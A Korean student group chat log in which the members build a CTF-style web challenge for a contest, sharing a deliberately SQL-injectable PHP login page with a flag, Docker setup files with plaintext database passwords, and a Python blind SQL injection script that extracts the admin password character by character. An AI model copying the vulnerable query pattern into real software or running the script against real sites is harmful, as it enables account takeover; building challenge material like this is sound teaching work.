+[송민영] [오후 5:39] 나 지금 알바여서 집에 가서 나도 한번 확인해볼게
+[김나진] [오후 5:46] 막힌건 아니고 /etc/ssh/sshd_config 파일이 어딨는지 모르겠어
+[김나진] [오후 5:50] sudo cd 이러니까 명령어가 안먹히더라고
+--------------- 2020년 11월 7일 토요일 ---------------
+[김나진] [오후 1:05] 혹시 컴퓨터 ubuntu인 사람...  지우언니가 ubuntu랑 php 버전 알려달래
+[남지윤] [오후 1:25] 아닌뎅...
+[김나진] [오후 1:26] 오우...
+[송민영] [오후 1:29] 컴퓨터가 우분투인 사람이 있을까..?
+[남지윤] [오후 1:30] 그러게...
+[김나진] [오후 1:31] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㄲㅋㅋㅋㅋㅋㅋ
+[송민영] [오후 1:34] 어떻게 해야되는거지...
+[송민영] [오후 2:13] 지금 mysql 서버 하는데 까지만 진행된거지?
+[김나진] [오후 2:22] 어제 만들어보긴 했는데... virtual box 다른 가상머신 커널패닉나서 갈아엎었거든. 다시 만들어야 할 것 같아..  그리고 지금 php 파일 수정중이야
+[김나진] [오후 2:22] <?php
+    if(!defined('DB')) exit('bye');
+    define('DB_HOST', getenv('DB_HOST'));
+    define('DB_USERNAME', getenv('DB_USER'));
+    define('DB_PASSWORD', getenv('DB_PASSWORD')); 
+    define('DB_NAME', getenv('DB_NAME'));
+
+    #echo "<h1>".getenv('DB_NAME')."</h1>";
+
+    $con = mysqli_connect(DB_HOST, DB_USERNAME, DB_PASSWORD, DB_NAME);
+
+    if(mysqli_connect_errno()) {
+        echo "Failed to connect to MySQL: " . mysqli_connect_error();
+    }
+    echo "<br>";
+
+    if (!$con) {
+        echo "Error: " . mysqli_connect_error();
+        exit();
+    }
+?>
+[김나진] [오후 2:23] db랑 연결하는 거 이거 참고해서 수정하라고 했거든
+[송민영] [오후 2:29] db host나 그런거는 환경변수로 설정하면 되는거지
+[김나진] [오후 2:30] 그런듯
+[송민영] [오후 2:31] 그럼 db host가 127.0.0.1이면 되는건가
+[김나진] [오후 3:00] 응 localhost면 될 것 같디니
+[김나진] [오후 3:00] 대
+[송민영] [오후 3:42] https://edykim.com/ko/post/using-the-docker-in-a-regular-php-project-development-environment/
+[송민영] [오후 3:45] 지금 리눅스 서버에서 하고 있는거지
+[김나진] [오후 3:47] 나는 윈도우에서 boot2docker 로 하다가 지웠어 이따가 다른 pc에서 리눅스 가상머신으로 해보려고
+[송민영] [오후 4:44] 그럼 내일까지 각자 해보고 상의하도록 할까?
+[김나진] [오후 4:45] 그러자
+[남지윤] [오후 10:22] 이모티콘
+--------------- 2020년 11월 8일 일요일 ---------------
+[김나진] [오전 1:32] https://judo0179.tistory.com/69
+[김나진] [오전 1:32] https://www.everdevel.com/MySQL/execute/
+[김나진] [오전 1:33] 지우 언니가 참고해보라고 한 사이트들이야
+[송민영] [오후 4:04] 잘되고 있니
+[남지윤] [오후 4:19] 나는 잘안되더라,,,
+[송민영] [오후 4:23] 나도 하고있긴 한데
+[송민영] [오후 4:23] 이게 맞는건지 모르겠네
+[김나진] [오후 4:29] 나는 아예 다른 pc에서 시작해서 필요한거 다운받으려고..
+[송민영] [오후 4:30] 우리 이거 오늘까지인가
+[김나진] [오후 4:30] 음...  대회가 11일이니까...
+[김나진] [오후 4:30] ㅋㅋㅋㅋㅋㄱㅋㅋㅋㄱㅋㄱㄲ
+[김나진] [오후 4:31] 오늘 끝내는게 좋을 것 같아
+[김나진] [오후 4:31] 오늘 밤 새서라도 성공 시킬거여
+[남지윤] [오후 4:31] 저쪽팀도 도커 아직 못했나보네
+[김나진] [오후 4:31] 총체적 난국인걸
+[남지윤] [오후 4:31] 그르니까
+[김나진] [오후 4:31] 2학년 애기들보고 도커파일을 만들라니..
+[남지윤] [오후 4:32] 컴과졸업한 사촌언니도 도커 쉅들었는데도
+[남지윤] [오후 4:32] 어려워서 실습안했대
+[남지윤] [오후 4:32] ....
+[남지윤] [오후 4:32] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오후 4:32] ㅋㅋㅋㅋㄱㅋㅋㅋㅋㅋㅋㅋㄱ
+[남지윤] [오후 4:32] 막막하다
+[김나진] [오후 4:32] 해보면,. .  언젠가는 도움이 되지 않을까...
+[남지윤] [오후 4:32] 재아언니는 우리보다 훨씬 전부터
+[남지윤] [오후 4:33] 하고있었는데
+[남지윤] [오후 4:33] ㅇ안된대...
+[김나진] [오후 4:33] 정 안되면 원래 만드시던 분들이 하시겠지...ㅎ
+[남지윤] [오후 4:33] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ...그치ㅎㅎ
+[김나진] [오후 5:10] 여러분 큰일났어요
+[김나진] [오후 5:10] 웹문제 환경구성할 때 apache2.conf 파일이라던지 따로 수정한 파일 있으면 그대로 보내줄래?
+[김나진] [오후 5:10] 그리고 익스플로잇 코드도 보내줘~
+[김나진] [오후 5:10] 문제 이름이나 페이지 제목이 administrator이니까 id는 admin이나 webmaster 이런 것 중에서 충분히 게싱이 가능하거든 그러니까 admin을 id에 박아놓지 말고 id도 입력받을 수 있도록 수정해주고 db admin은 webmaster로 하고 수정한 익스코드랑 코드들 보내줘
+[김나진] [오후 5:10] 오늘까지 보내줄래
+[송민영] [오후 5:10] 그렇게 했는데
+[송민영] [오후 5:10] 어려워서 못했다고
+[송민영] [오후 5:10] 하면 안돼?
+[김나진] [오후 5:11] 오케
+[김나진] [오후 5:11] conf 파일은 뭘까
+[송민영] [오후 5:12] /etc/apache2/apache2.conf
+기본 설정파일로, 다른 배포판에서 httpd.conf를 기본 설정파일로 사용하고 있는데 우분투에서는 apache2.conf를 사용한다
+
+
+
+출처: https://webdir.tistory.com/196 [WEBDIR]
+[송민영] [오후 5:12] 익스플로잇 코드랄게 있나
+[송민영] [오후 5:12] 없지 않아
+[김나진] [오후 5:13] 그 파이썬으로 돌리면 되지 그치
+[송민영] [오후 5:13] 아 그거
+[송민영] [오후 5:13] 응응
+[송민영] [오후 5:14] db admin은 webmaster
+[송민영] [오후 5:14] 이건 뭐지
+[김나진] [오후 5:14] 아 우리 저 서버 아이디 중에 admin 있잖아
+[김나진] [오후 5:14] 그거 webmaster로 바꾸는 건가봐
+[김나진] [오후 5:15] 서버 테이블에 있는 아이디
+[송민영] [오후 5:17] 아
+[송민영] [오후 5:17] 그럼 그냥 딱히 생각할 필요 없나?
+[김나진] [오후 5:31] 응 서버 테이블만 다시 만들면 될걸
+[송민영] [오후 5:54] 계속 에러나는데
+[송민영] [오후 5:54] 왜 에러나는지 모르겠음
+[송민영] [오후 5:54] 그냥 블로그 따라하는데
+[송민영] [오후 5:54] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ
+[김나진] [오후 5:54] 도커?
+[송민영] [오후 5:54] ㅇㅇ
+[남지윤] [오후 6:02] 나 이제 알바끝나고 서울가서
+[남지윤] [오후 6:02] 도착해서야 할 수 있을꺼같은데,,
+[남지윤] [오후 6:02] 가면서도 최대한봐볼게
+[김나진] [오후 6:48] 아 우리 admin 비번 뭐였더라
+[송민영] [오후 6:54] 디코에 있을걸
+[김나진] [오후 7:37] 사진
+[김나진] [오후 7:37] 오 이런
+[김나진] [오후 7:37] 화질 무엇
+[김나진] [오후 7:37] 코드 수정했어 뚫리게...
+[송민영] [오후 7:41] 오케이...
+[송민영] [오후 7:41] 나머지는 그대로 가는거지?
+[김나진] [오후 7:44] 조금 바뀌었어
+[김나진] [오후 7:44] 최종적으로 수정되면 코드 뿌릴게
+[김나진] [오후 8:09] <html>
+
+<head>
+
+<title>Goofy Administrator</title>
+
+<style type="text/css">
+
+body { background:white; color:black; font-size:10pt; }
+
+input { background:silver; color:black; font-size:9pt; }
+
+</style>
+
+</head>
+
+<body><br><br>
+
+<center>
+
+<form method=get action=index_process.php>
+
+<table border=0 align=center cellpadding=10 cellspacing=0>
+
+<tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+
+<tr><td align=center>id : <input name='id' size=30></td><td></td></tr>
+
+<tr><td align=center>pw : <input name='pw' size=30></td><td><input type=submit></td></tr>
+
+</form>
+
+</center>
+
+</body>
+
+</html>
+
+
+[김나진] [오후 8:09] //config.php
+
+<?php
+
+//php versioin: 7.4.7
+
+/*
+
+DB_HOST
+
+DB_USERNAME
+
+DB_PASSWORD
+
+DB_NAME
+
+*/
+
+$host = 'localhost';
+
+$username = 'root';
+
+$password = '000523';
+
+$name = 'problem';
+
+ 
+
+?>
+[김나진] [오후 8:10] //index_process.php
+
+<?php
+
+  include "./config.php";
+
+ 
+
+    $connect = mysqli_connect($host, $username, $password, $name);
+
+ 
+
+    if(mysqli_connect_errno()) {
+
+        echo "Failed to connect to MySQL: " . mysqli_connect_error();
+
+    }
+
+    echo "<br>";
+
+ 
+
+    if (!$connect) {
+
+        echo "Error: " . mysqli_connect_error();
+
+        exit();
+
+    }
+
+ 
+
+  ?>
+
+ 
+
+ 
+
+  <html>
+
+  <head>
+
+  <title>Goofy Administrator</title>
+
+  <style type="text/css">
+
+  body { background:white; color:black; font-size:10pt; }
+
+  input { background:silver; color:black; font-size:9pt; }
+
+  </style>
+
+  </head>
+
+  <body><br><br>
+
+  <center>
+
+  <form method=get action=index_process.php>
+
+  <table border=0 align=center cellpadding=10 cellspacing=0>
+
+  <tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+
+  <tr><td align=center>id : <input name='id' size=30></td><td></td></tr>
+
+  <tr><td align=center>pw : <input name='pw' size=30></td><td><input type=submit></td></tr>
+
+  </form>
+
+  <?php
+
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET['pw'])) exit("No Hack ~_~");
+
+ 
+
+  $query = "select id from user where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
+
+  $result = mysqli_fetch_array(mysqli_query($connect, $query));
+
+  if($result===null){
+
+    echo "Oh.... nonono...<br>Now stand back and let me tell you my tale of woe.
+
+    <h2>Don't be a webm45ter</h2>";
+
+  }
+
+  else {echo "<h2>Hello webmaster!</h2>";
+
+ 
+
+  $_GET['pw']=addslashes($_GET['pw']);
+
+  $query="select id, pw from user where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
+
+  $result=mysqli_fetch_array(mysqli_query($connect, $query));
+
+  if($result)
+
+    if($result['id'] == $_GET['id'] && ($result['pw']) && ($result['pw'] == $_GET['pw']))
+
+      echo "POX{v4cc1ne_p4ssw0rd_9et_daedanhae}";
+
+  }
+
+ 
+
+  ?>
+
+  </center>
+
+  </body>
+
+  </html>
+[김나진] [오후 8:10] 짠
+[김나진] [오후 8:10] db 비번 000523으로 바꿨어
+[김나진] [오후 8:10] 테이블 계정 id가 admin인 걸 webmaster로 변경했어
+[김나진] [오후 8:10] webmaster 비번은 똑같아
+[송민영] [오후 9:12] 진짜 도커 포기
+[송민영] [오후 9:12] 계속 에러떠
+[남지윤] [오후 9:13] 나도 마찬가지..
+[남지윤] [오후 9:14] 노트북 뿌술뻔했어 화나서ㅠ
+[송민영] [오후 9:14] 다른 조는 어떻데?
+[송민영] [오후 9:14] 지금?
+[남지윤] [오후 9:14] 저기도
+[남지윤] [오후 9:14] 못하고있대
+[송민영] [오후 9:14] ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ...
+[송민영] [오후 9:14] 되나 싶으면 에러뜨고
+[송민영] [오후 9:54] 사진
+[송민영] [오후 9:55] 이렇게 뜨는데
+[송민영] [오후 9:55] 이게 맞나
+[남지윤] [오후 9:55] 오
+[남지윤] [오후 9:55] 맞는거같은데...??ㅔ
+[김나진] [오후 9:55] 와우
+[송민영] [오후 9:55] 근데 hello가 떠야 된다는데
+[송민영] [오후 9:55] 이게 뜨는데?
+[송민영] [오후 9:55] https://falsy.me/docker-1-docker%EB%A1%9C-ubuntu-apache-php-%ED%99%98%EA%B2%BD%EC%9D%98-%EC%9D%B4%EB%AF%B8%EC%A7%80-%EB%A7%8C%EB%93%A4%EA%B8%B0/
+[송민영] [오후 9:55] 여기 그대로 따라하긴 함
+[송민영] [오후 9:58] 저게 아닌가봐
+[송민영] [오후 10:00] 난 포기할련다
+[송민영] [오후 10:00] 뭐 해도 아무것도 안되는데
+[송민영] [오후 10:10] 나진나진
+[김나진] [오후 11:00] ?
+[김나진] [오후 11:00] 나 지금 컴퓨터에 사고 쳐서... 다시 설치중이야
+[김나진] [오후 11:01] 혹시 우리가 낸 문제 exploit code 작성할 사람?
+[송민영] [오후 11:01] 나 지금 도커 hello 출력까지 됐거든
+[송민영] [오후 11:02] 조금만 더 손대면 될거 같은데
+[송민영] [오후 11:02] 너희 둘중에서 하는게 좋을거 같아
+[남지윤] [오후 11:02] 혹시 그거 언제까지해야돼??
+[김나진] [오후 11:02] 오늘><
+[남지윤] [오후 11:03] 내가 지금 큰일이난게 서울을 올라왔는데
+[남지윤] [오후 11:03] 노트북이없어서...
+[김나진] [오후 11:03] 뭐 새벽에 보내도 되지 않을까
+[남지윤] [오후 11:03] 안가져와버렸어
+[김나진] [오후 11:03] 내가 해볼게
+[남지윤] [오후 11:03] 왜없는지모르겠어...
+[남지윤] [오후 11:03] ㅠㅠㅠㅠㅠ
+[남지윤] [오후 11:03] 멘붕이야..
+[김나진] [오후 11:03] 워워 괜찮아
+[남지윤] [오후 11:04] 낼 택배로 보내달라고하깅했는데..
+[송민영] [오후 11:40] 혹시 윈도우에서
+[송민영] [오후 11:40] config.php 파일 넣어서 했을때 잘됬어?
+[김나진] [오후 11:41] 응
+[김나진] [오후 11:41] 아 연결이 안돼?
+[송민영] [오후 11:41] mysql이 연결이 안되는듯
+[송민영] [오후 11:41] ㅠㅠㅠㅠㅠㅠㅠㅠㅠ
+[송민영] [오후 11:41] mysql 연결만 하면 끝나는데
+[김나진] [오후 11:45] 어...  config.php에서 데이터 베이스 비번 뭐라고 되어 있어?
+[송민영] [오후 11:45] 000532인가
+[송민영] [오후 11:45] 너가 보내준거
+[김나진] [오후 11:45] mysql 관련해서 도커파일 만들었어?
+[송민영] [오후 11:46] 응응
+[송민영] [오후 11:46] 혹시 넌 돼?
+[김나진] [오후 11:46] 뭐를 도커파일로 만든거야?
+[김나진] [오후 11:46] 뭐가? 도커?
+[송민영] [오후 11:46] 그 mysql하고 서버 연결
+[송민영] [오후 11:46] 도커로 했을때
+[김나진] [오후 11:47] 난 아직 도커 시작도 못했어...
+[송민영] [오후 11:47] 2시전까지 할수 있겠지
+[송민영] [오후 11:47] 내일 아침 병원 예약있어서
+[송민영] [오후 11:47] 3시에는 자야 되는데
+[김나진] [오후 11:49] 와우...
+--------------- 2020년 11월 9일 월요일 ---------------
+[송민영] [오전 12:22] 일단 내가 한데까지 보내줄게
+[송민영] [오전 12:24] ~/php/goofy_admin안에 php파일 3개 들어있고
+[송민영] [오전 12:24] 나머지는 ~에
+[송민영] [오전 12:25] 파일: Downloads.zip
+[송민영] [오전 2:24] 파일: goofy_administrator.zip
+[김나진] [오전 2:29] 오 이건 뭐야
+[송민영] [오전 2:32] ㄱㄷㄱㄷ
+[송민영] [오전 2:32] 저걸로 하고 코드 바꾸는게 있거든
+[송민영] [오전 2:33] ❯ cat Dockerfile
+FROM ubuntu:18.04
+MAINTAINER koharin
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+RUN apt-get update -y
+RUN apt-get install -y apache2 php libapache2-mod-php mysql-server
+
+ENV APACHE_RUN_USER www-data
+ENV APACHE_RUN_GROUP www-data 
+
+ADD ./prob /var/www/html/goofy_administrator 
+ADD ./goofy-db/db.sql /mysql/
+RUN service mysql start && mysql < /mysql/db.sql 
+
+RUN rm /var/www/html/index.html 
+WORKDIR /var/www/html/goofy_administrator 
+EXPOSE 80
+
+CMD ["/usr/sbin/apache2ctl", "-D", "FOREGROUND"]
+[송민영] [오전 2:33] ❯ cat config.php 
+<?php
+//php versioin: 7.4.7
+define('DB_HOST', getenv('DB_HOST'));
+define('DB_USERNAME', getenv('DB_USER'));
+define('DB_PASSWORD', getenv('DB_PASSWORD')); 
+define('DB_NAME', getenv('DB_NAME'));
+#$host = 'db'; //service name from docker-compose.yml
+#$username = 'webmaster';
+#$password = 'im000523';
+#$db_name = 'problem';
+$connect = mysqli_connect(DB_HOST, DB_USERNAME, DB_PASSWORD, DB_NAME);
+?>
+[송민영] [오전 2:33] version: '3'                                                                                                                                                                                               
+services:
+    web:
+        build:
+            context: .
+            dockerfile: Dockerfile
+        container_name: goofy-web
+        depends_on:
+            - db
+        volumes:
+            - ./prob:/var/www/html/goofy_administrator/
+        ports:
+            - "22210:80"
+        environment:
+            DB_HOST: db
+            DB_NAME: poxroot$$
+            DB_USER: root
+            DB_PASSWORD : 000523
+    db:
+        container_name: goofy-db
+        image: mysql:8.0
+        command: --default-authentication-plugin=mysql_native_password
+        restart: always
+        environment:
+            MYSQL_ROOT_PASSWORD: root
+            MYSQL_DATABASE: poxroot$$
+            MYSQL_USER: root
+            MYSQL_PASSWORD: 000523
+        ports:
+            - "23211:80"
+        volumes:
+            - "./goofy-db/:/docker-entrypoint-initdb.d/"
+[송민영] [오전 2:34] 이거 다운받고
+[송민영] [오전 2:34] 나머지 바꾸면 돼
+[송민영] [오전 2:34] 월요일까지 무조건 올려야 되나봐
+[김나진] [오전 2:41] 고생했어 언니
+[송민영] [오전 2:41] 아 근데 아직 끝이 아님...ㅎ
+[김나진] [오전 2:41] . ...ㅎ
+[송민영] [오전 2:49] 지우가 윈도우에서 된다고 하긴 하던데
+[송민영] [오전 2:49] 한번 해봐봐
+[김나진] [오전 3:03] 내가 지금 우분투여서. .. 우분투로 해볼게
+[송민영] [오전 3:04] 무조건 우분투로 해야된데
+[김나진] [오전 3:05] 어... 잘된건가..
+[송민영] [오전 3:06] 보니깐 vm에서는 index_process 넘어간다는데
+[송민영] [오전 3:06] 윈도우에서도 넘어가?
+[김나진] [오전 3:08] 윈도우에서는 아예 안 건드렸어
+[김나진] [오전 3:08] 지금 우분투로 하고 있어
+[송민영] [오전 3:10] 그 윈도우에서 보니깐
+[송민영] [오전 3:10] 아이피로 하던데
+[송민영] [오전 3:10] 지우는
+[송민영] [오전 3:10] url이
+[송민영] [오전 3:11] 글고 아마 db.sql의 db명 그런거 바꿔야 될거야
+[김나진] [오전 3:13] 으아아
+[김나진] [오전 3:14] 보내준 코드로 어딜 바꾸는 거야?
+[송민영] [오전 3:14] db.sql에서
+[송민영] [오전 3:14] 우리가 만든 db명하고 passwd가 다를걸
+[김나진] [오전 3:18] db.sql에 있는 db명이랑 비번으로 config.php 바꾸는거야?
+[송민영] [오전 3:18] 노노
+[송민영] [오전 3:19] db.sql만 원래 우리가 할려던 걸로 바꾸면돼
+[김나진] [오전 3:19] 아 그러기만 하면 돼?
+[송민영] [오전 3:19] 응응
+[송민영] [오전 3:19] 그리고 그 길게 코드 보내준거 있자나
+[송민영] [오전 3:19] 그것만 그 파일에 덮어쓰면 돼
+[김나진] [오전 3:20] 내가 보내줬던 코드에 있던 db명이랑 passwd로?
+[김나진] [오전 3:20] 그 파일이...
+[송민영] [오전 3:26] 응응
+[송민영] [오전 3:26] 이런거
+[송민영] [오전 3:26] 잠깐만
+[김나진] [오전 3:26] ?
+[송민영] [오전 3:26] 이거
+[송민영] [오전 3:27] 이거
+[송민영] [오전 3:27] 그리고 지우가 풀이 보내달래
+[김나진] [오전 3:27] 풀이는 내가 해볼게
+[송민영] [오전 3:27] ❯ cat Dockerfile
+FROM ubuntu:18.04
+MAINTAINER koharin
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+RUN apt-get update -y
+RUN apt-get install -y apache2 php libapache2-mod-php mysql-server
+
+ENV APACHE_RUN_USER www-data
+ENV APACHE_RUN_GROUP www-data 
+
+ADD ./prob /var/www/html/goofy_administrator 
+ADD ./goofy-db/db.sql /mysql/
+RUN service mysql start && mysql < /mysql/db.sql 
+
+RUN rm /var/www/html/index.html 
+WORKDIR /var/www/html/goofy_administrator 
+EXPOSE 80
+
+CMD ["/usr/sbin/apache2ctl", "-D", "FOREGROUND"]
+[송민영] [오전 3:28] Dockerfile은 이걸로 바꾸면 돼
+[김나진] [오전 3:28] 응
+[김나진] [오전 3:29] 어 잠만 원래 db.sql에 있던거로 config.php 수정하는 거야?
+[송민영] [오전 3:30] 에??
+[송민영] [오전 3:31] config.php 수정하는게
+[송민영] [오전 3:31] 그냥 환경변수로 받을려고
+[김나진] [오전 3:32] config.php 수정하는 거야 아니면 db.sql 수정하는 거야
+[송민영] [오전 3:32] 이거는 docker-compose.yml 파일에 변경하면 돼
+[송민영] [오전 3:32] 둘다
+[김나진] [오전 3:32] 원래 우리 하려던거로?
+[송민영] [오전 3:32] db.sql은 우리가 할려던 데이터베이스명, 그런걸로 바꾸면 되고
+[송민영] [오전 3:32] config.php는 지금 내가 답장이라고 한걸로 바꾸면 돼
+[송민영] [오전 3:32] 아
+[송민영] [오전 3:33] config.php에서도 바꿔야 된다.
+[김나진] [오전 3:33] 디비명이 problem 테이블명이 user 뭐 이렇게?
+[송민영] [오전 3:33] 응응
+[송민영] [오전 3:33] #을 주석처리로 한거 같은데 이걸 php 주석처리로 바꾸면 될거 같아
+[김나진] [오전 3:37] username이 우리 root였던 것 같은데  root로 하면 되려나
+[송민영] [오전 3:40] 그래도 되지 않을까
+[송민영] [오전 3:40] 아니면 우리것을 바꾼던지
+[김나진] [오전 3:45] 우리걸 바꾸면 db.sql이랑 그외 php 파일을 바꾸면 되는 걸까?
+[송민영] [오전 3:45] 우리걸 바꾸는게 우리 테이블명 그런거 말하는거지
+[송민영] [오전 3:46] 그러면 안바꿔도 되지 않을까
+[김나진] [오전 3:46] 응 도커파일이나 yml파일에 있는 대로
+[송민영] [오전 3:47] 그러면 안바꿔도 될걸
+[송민영] [오전 3:47] 그대신 우리가 만든 php는
+[송민영] [오전 3:47] 바꿔야 될듯
+[김나진] [오전 3:47] 오케이
+[송민영] [오전 3:48] 그럼 그냥 우리거 바꾸는 걸로?
+[김나진] [오전 3:48] 그러자
+[송민영] [오전 3:48] 오케
+[송민영] [오전 3:48] 대신 비번만 우리걸로?
+[송민영] [오전 3:48] 아님 비번도 그냥 바꾸는 걸로?
+[김나진] [오전 3:54] 잠깐만
+[김나진] [오전 3:58] 삭제된 메시지입니다.
+[김나진] [오전 3:59] 내가 text로 좀 길게 해서 보내줄게 엔터치니까 바로 가버리네
+[김나진] [오전 4:04] <yml 파일>
+mysql_root_password: root
+mysql_database: goofy_administrator
+mysql_user: master
+mysql_password: imgoofy
+<db.sql>
+데베명: goofy_administrator
+테이블명: goofy
+'webmaster', 'sm6yn23ib9'
+'guest', 'n0n0n0'
+[송민영] [오전 4:05] 오키오키
+[송민영] [오전 4:05] 지금 거의 다 된거여서
+[김나진] [오전 4:05] db.sql에서는 webmaster 비번을 우리가 원래 정했던 sm6yn23ib9로만 변경하는 걸로..
+[송민영] [오전 4:06] mysql 연동하고 윈도우에서 시행만 되면 끝나거든
+[김나진] [오전 4:06] 그러면 config.php에서 sql로 연결할 때 쓰는 유저 명은 master로 하면 되나...?
+[송민영] [오전 4:06] 그럴걸
+[김나진] [오전 4:06] yml 파일에서 dbhost를 poxroot$$로 해둬도 괜찮나?
+[김나진] [오전 4:07] 아니지아니지
+[송민영] [오전 4:07] db로
+[김나진] [오전 4:07] dbname으로 goofy_administrator로 하는거고
+[송민영] [오전 4:08] 응응
+[김나진] [오전 4:08] 그러면 dbhost는 그대로 poxroot$$이렇게 하면 되나?
+[송민영] [오전 4:08] ㄴㄴ
+[송민영] [오전 4:08] db
+[송민영] [오전 4:08] 바꿔줘야돼
+[김나진] [오전 4:08] dbhost를 db로...?
+[송민영] [오전 4:08] 응응
+[송민영] [오전 4:08] 나 이제 자러가봐야 될거 같아서
+[송민영] [오전 4:09] 일단 내가 된거로는
+[송민영] [오전 4:09] index.php 들어가는 거였거든
+[송민영] [오전 4:09] 지우가 vm환경에서 mysql 까지 연동 다 시켰다고 해서
+[송민영] [오전 4:09] 혹시 안되는 거 있으면 지우한테 낼 물어보면 될거 같아
+[송민영] [오전 4:09] 그리고 남은게 윈도우 환경에서 시행하는 건데
+[김나진] [오전 4:10] 저 도커를 어떻게 실행해봐야 하나...
+[송민영] [오전 4:10] docker-compose up -d --build
+[송민영] [오전 4:10] https://jang8584.tistory.com/267
+[송민영] [오전 4:10] mysql 설치는 아직 안했으면 이거 보고 하면 될거 같고
+[송민영] [오전 4:11] 이것도 지우가 조금 한거 같아서 그것도 하다가 모르겠으면 물어보면 될거 같아
+[송민영] [오전 4:11] 아마 내일 병원+알바 때문에
+[송민영] [오전 4:11] 밤늦게 확인할 거 같아서...
+[김나진] [오전 4:11] 알았어...
+[송민영] [오전 4:12] 그래그래
+[송민영] [오전 4:12] 고생햇어
+[송민영] [오전 4:13] 진짜 막바지여서 조금만 고생하면 금방 끝날거 같아
+[김나진] [오전 4:14] 언니가 제일....
+[김나진] [오전 4:15] 오늘 고생 많았어 잘자
+[송민영] [오후 1:59] 잘돼가고 있니
+[김나진] [오후 2:18] 되는 듯 안되는듯.,  우리 코드가 쿠키가 없어서 집가서 쿠키 만드는 코드 추가해야해
+[남지윤] [오후 2:29] 헐,,다들 늦게까지 고생했네…
+[송민영] [오후 5:42] 6시까지 제출이라는데
+[송민영] [오후 5:42] 도커 다 해결됐어??
+[김나진] [오후 7:38] 어... 아니?
+[김나진] [오후 7:39] 나 지우언니한테 7시 넘어서 코드 수정하고 도커 실행하겠다고 했는데..
+[송민영] [오후 10:57] 지금 집에 도착해썽
+[송민영] [오후 10:57] 어찌 되가고 잇니
+[김나진] [오후 10:58] 내 윈도우 pc 자체에서는 인젝션도 잘 되는데
+[김나진] [오후 10:59] 지우언니가 컨테이너 실행해서 vm아이피로 접속했는데 요청처리가 안 된대 이거 해결해야 할 것 같아
+[송민영] [오후 10:59] 오잉
+[김나진] [오후 10:59] 그리고 index.php 수정했고
+[김나진] [오후 10:59] 또 exploit 코드도 수정했어
+[송민영] [오후 10:59] 아하
+[송민영] [오후 10:59] 그럼 이것만 처리하면 끝나는거지
+[김나진] [오후 10:59] import requests
+import string
+
+headers = {'Cookie': 'HEYGOOFY=0h1f0r90tmypa55w0rd'}#알맞은 쿠키 값넣기
+url = "http://127.0.0.1/problem/index_process2.php"#알맞은 url 넣기
+string = "1234567890abcdefghijklmnopqrstuvwxyz"
+
+pw = ''
+len = 1
+while True:
+    data = "?id=webmaster&pw=' or id='webmaster' and length(pw)= "+str(len)+"%23"
+    r = requests.get(url + data, headers = headers)
+    print(len)
+    if r.text.find('Hello webmaster!') != -1:
+        break
+    len += 1
+print ("password length : ", len)
+num = 1
+for i in range(1, len+1):
+    for j in string:
+        data = "?id=webmaster&pw=' or id='webmaster' and substr(pw,"+str(i)+",1)='"+j+"'%23"#'?id=webmaster%26%26instr(mid(pw,'+str(i)+',1),"'+j+'")'
+        r = requests.get(url+data,headers = headers)
+        if r.text.find('Hello webmaster!') != -1 :
+            pw = pw + j
+            print("finding...: ", pw)
+            break
+print("Password: ", pw)
+
+[김나진] [오후 11:00] 도커로 올려진 걸 윈도우로는 아직 안해봤을걸
+[김나진] [오후 11:00] exploit code야
+[김나진] [오후 11:00] <?php
+  setcookie('HEYGOOFY','0h1f0r90tmypa55w0rd',time()+3600);
+ ?>
+<html>
+<head>
+<title>Goofy Administrator</title>
+<style type="text/css">
+body { background:white; color:black; font-size:10pt; }
+input { background:silver; color:black; font-size:9pt; }
+</style>
+</head>
+<body><br><br>
+<center>
+<form method=get action=index_process2.php>
+<table border=0 align=center cellpadding=10 cellspacing=0>
+<tr><td colspan=2 align=center><h1>Goofy Administrator</h1></td></tr>
+<tr><td align=center>id : <input name='id' size=30></td><td></td></tr>
+<tr><td align=center>pw : <input name='pw' size=30></td><td><input type=submit></td></tr>
+</form>
+</center>
+</body>
+</html>
+[송민영] [오후 11:01] 요청처리가 문제인거네
+[김나진] [오후 11:01] 이건 index.php 쿠키 생성 코드 추가했어
+[김나진] [오후 11:01] 응..
+[송민영] [오후 11:01] 지우가 어떻게 하라던지
+[송민영] [오후 11:02] 그런말 했어?
+[송민영] [오후 11:03] 저쪽팀 도커 완료했다는데 한번 물어볼까
+[송민영] [오후 11:03] 아니면
+[김나진] [오후 11:04] 그래그래 그리고 컨테이너 실행할 때 mysql start 되도록 하는거 해결했으니까 docker-compose.yml이랑 Dockerfile 수정한거 다시 보낼게
+[김나진] [오후 11:04] setup.sh는 Dockerfile이랑 docker-compose.yml 경로에 같이 넣으면 돼
+[김나진] [오후 11:04] 파일: goofy.zip
+[김나진] [오후 11:05] 한번 물어보자
+[송민영] [오후 11:05] 그 index_process.php가 요청안되는 거 맞지?
+[김나진] [오후 11:06] 사진
+[김나진] [오후 11:06] 사진
+[김나진] [오후 11:06] 응
+[송민영] [오후 11:10] vm 내에서 실행했을때는 된거지
+[송민영] [오후 11:10] 윈도우에서 vm아이피로 접속했을때 안된느거고
+[김나진] [오후 11:11] 윈도우는 localhost로 한거야 vm으로 접속한게 아니라
+[송민영] [오후 11:11] 아이피가 vm 아이피 아니야?
+[김나진] [오후 11:11] 응 그냥 localhost로 한거야
+[송민영] [오후 11:12] 그럼 vmware안에서 실행했을때 안된다는 거야?
+[김나진] [오후 11:17] 아니아니 우분투에서 실행했어 접속은 vm 밖에서도 잘 돌아가는지 확인하기 위해 윈도우 브라우저에서 접속해서 확인해봤고
+[송민영] [오후 11:17] 그럼 vm밖에서 했을때 안된다는 거지?
+[송민영] [오후 11:18] 지우가
+[송민영] [오후 11:18] 너는 되고
+[김나진] [오후 11:19] 애초에 나는 윈도우 localhost에서 그냥 한거야 docker이런거 전혀 실행 안했어.
+[송민영] [오후 11:19] 아 오키
+[김나진] [오후 11:19] 난 똥멍청이야
